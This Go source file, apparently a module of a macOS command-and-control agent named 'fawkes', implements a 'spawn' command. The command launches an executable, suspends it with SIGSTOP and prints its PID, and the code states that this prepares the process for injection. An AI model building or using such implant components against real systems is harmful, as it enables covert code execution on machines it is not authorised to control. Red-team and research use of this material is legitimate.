//go:build darwin

package commands

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type SpawnCommand struct{}

func (c *SpawnCommand) Name() string        { return "spawn" }
func (c *SpawnCommand) Description() string { return "Spawn a suspended process for injection" }

func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[SpawnParams](task)
	if parseErr != nil {
		return *parseErr
	}

	params.Mode = strings.ToLower(params.Mode)
	if params.Mode == "" {
		params.Mode = "process"
	}

	switch params.Mode {
	case "process":
		return spawnSuspendedProcessDarwin(params)
	case "thread":
		return errorResult("Error: thread mode is not supported on macOS")
	default:
		return errorf("Unknown mode: %s (use process)", params.Mode)
	}
}

func spawnSuspendedProcessDarwin(params SpawnParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: path is required")
	}

	var sb strings.Builder
	sb.WriteString("[*] Spawn Mode: Suspended Process (macOS)\n")
	sb.WriteString(fmt.Sprintf("[*] Target executable: %s\n", params.Path))

	parts := strings.Fields(params.Path)
	var cmd *exec.Cmd
	if len(parts) > 1 {
		cmd = exec.Command(parts[0], parts[1:]...)
	} else {
		cmd = exec.Command(parts[0])
	}

	if err := cmd.Start(); err != nil {
		return errorf("Error starting process: %v", err)
	}

	pid := cmd.Process.Pid

	if err := syscall.Kill(pid, syscall.SIGSTOP); err != nil {
		return errorf("Error sending SIGSTOP: %v", err)
	}

	time.Sleep(50 * time.Millisecond)

	sb.WriteString("[+] Process created and stopped (SIGSTOP)\n")
	sb.WriteString(fmt.Sprintf("[+] Process ID (PID): %d\n", pid))
	sb.WriteString("\n[*] Process is stopped. Resume with SIGCONT when ready:\n")
	sb.WriteString(fmt.Sprintf("    kill -CONT %d\n", pid))

	return successResult(sb.String())
}
